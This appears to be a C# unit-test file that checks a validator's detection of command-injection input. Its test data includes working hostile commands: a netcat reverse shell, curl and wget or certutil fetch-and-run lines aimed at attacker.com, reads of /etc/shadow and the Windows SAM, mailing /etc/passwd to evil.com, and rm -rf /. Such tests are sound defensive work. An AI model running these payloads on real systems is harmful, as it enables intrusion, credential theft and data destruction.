namespace MyMemoryServer.SecurityTests;

using Common.Contracts.Security;

/// <summary>
/// 命令注入防护测试 - 测试命令注入攻击
/// </summary>
public sealed class CommandInjectionTests
{
    private readonly Common.Security.Validation.JsonSchemaValidator _validator;

    public CommandInjectionTests()
    {
        _validator = new Common.Security.Validation.JsonSchemaValidator();
    }

    #region Unix命令注入测试

    [Theory]
    [InlineData("; ls -la")]
    [InlineData("| cat /etc/passwd")]
    [InlineData("&& rm -rf /")]
    [InlineData("|| whoami")]
    [InlineData("$(id)")]
    [InlineData("`cat /etc/shadow`")]
    [InlineData("; nc -e /bin/sh 10.0.0.1 4444")]
    [InlineData("| bash -c 'curl attacker.com/shell.sh | bash'")]
    [InlineData("&& wget http://attacker.com/malware -O /tmp/m && chmod +x /tmp/m && /tmp/m")]
    public void DetectMaliciousContent_UnixCommandInjection_ShouldDetect(string input)
    {
        var result = _validator.DetectMaliciousContent(input);
        result.IsValid.Should().BeFalse("Unix命令注入应该被检测到");
        result.DetectedAttacks.Should().Contain(ConstantManager.Security.AttackTypes.CommandInjection);
    }

    #endregion

    #region Windows命令注入测试

    [Theory]
    [InlineData("& dir")]
    [InlineData("&& type C:\\Windows\\System32\\config\\SAM")]
    [InlineData("| powershell -c 'Get-Process'")]
    [InlineData("|| whoami")]
    [InlineData("; net user attacker password123 /add")]
    [InlineData("& reg save HKLM\\SAM sam.bak")]
    [InlineData("| wmic process get name,processid")]
    [InlineData("&& certutil -urlcache -f http://attacker.com/malware.exe malware.exe")]
    public void DetectMaliciousContent_WindowsCommandInjection_ShouldDetect(string input)
    {
        var result = _validator.DetectMaliciousContent(input);
        result.IsValid.Should().BeFalse("Windows命令注入应该被检测到");
        result.DetectedAttacks.Should().Contain(ConstantManager.Security.AttackTypes.CommandInjection);
    }

    #endregion

    #region 编码绕过测试

    [Theory]
    [InlineData("%3B%20ls%20-la")]
    [InlineData("%7C%20cat%20/etc/passwd")]
    [InlineData("%26%26%20whoami")]
    public void DetectMaliciousContent_UrlEncodedInjection_ShouldDetectOrWarn(string input)
    {
        var result = _validator.DetectMaliciousContent(input);
        result.Should().NotBeNull();
    }

    [Theory]
    [InlineData("&#59;&#32;ls")]
    [InlineData("&#x3b;&#x20;ls")]
    public void DetectMaliciousContent_HtmlEncodedInjection_ShouldDetectOrWarn(string input)
    {
        var result = _validator.DetectMaliciousContent(input);
        result.Should().NotBeNull();
    }

    #endregion

    #region 特殊字符测试

    [Theory]
    [InlineData("$((cat /etc/passwd))")]
    [InlineData("${IFS}cat${IFS}/etc/passwd")]
    [InlineData("$(< /etc/passwd)")]
    [InlineData("((cat /etc/passwd))")]
    public void DetectMaliciousContent_SpecialCharacters_ShouldDetect(string input)
    {
        var result = _validator.DetectMaliciousContent(input);
        result.IsValid.Should().BeFalse("特殊字符命令注入应该被检测到");
    }

    #endregion

    #region 管道和重定向测试

    [Theory]
    [InlineData("| mail -s 'data' attacker@evil.com < /etc/passwd")]
    [InlineData("> /tmp/output.txt")]
    [InlineData(">> /var/log/app.log")]
    [InlineData("< /etc/passwd")]
    [InlineData("2>&1")]
    public void DetectMaliciousContent_PipeAndRedirect_ShouldDetect(string input)
    {
        var result = _validator.DetectMaliciousContent(input);
        result.IsValid.Should().BeFalse("管道和重定向攻击应该被检测到");
    }

    #endregion

    #region 反引号和命令替换测试

    [Theory]
    [InlineData("`id`")]
    [InlineData("`whoami`")]
    [InlineData("`cat /etc/passwd`")]
    [InlineData("$(whoami)")]
    [InlineData("$(cat /etc/shadow)")]
    public void DetectMaliciousContent_CommandSubstitution_ShouldDetect(string input)
    {
        var result = _validator.DetectMaliciousContent(input);
        result.IsValid.Should().BeFalse("命令替换攻击应该被检测到");
    }

    #endregion

    #region 合法命令内容测试

    [Theory]
    [InlineData("echo hello world")]
    [InlineData("ls -la /home/user")]
    [InlineData("grep pattern file.txt")]
    [InlineData("cat document.txt")]
    [InlineData("python script.py")]
    [InlineData("dotnet build")]
    public void DetectMaliciousContent_LegitimateCommands_ShouldNotDetect(string input)
    {
        var result = _validator.DetectMaliciousContent(input);
        result.IsValid.Should().BeTrue("合法命令不应被误判为恶意");
    }

    #endregion

    #region 环境变量注入测试

    [Theory]
    [InlineData("$PATH")]
    [InlineData("$HOME")]
    [InlineData("${PATH}")]
    [InlineData("%PATH%")]
    [InlineData("%USERPROFILE%")]
    public void DetectMaliciousContent_EnvironmentVariableInjection_ShouldDetect(string input)
    {
        var result = _validator.DetectMaliciousContent(input);
        result.IsValid.Should().BeFalse("环境变量注入应该被检测到");
    }

    #endregion

    #region 多行命令注入测试

    [Fact]
    public void DetectMaliciousContent_MultiLineInjection_ShouldDetect()
    {
        var input = "echo hello\nrm -rf /";
        var result = _validator.DetectMaliciousContent(input);
        result.IsValid.Should().BeFalse("多行命令注入应该被检测到");
    }

    #endregion
}
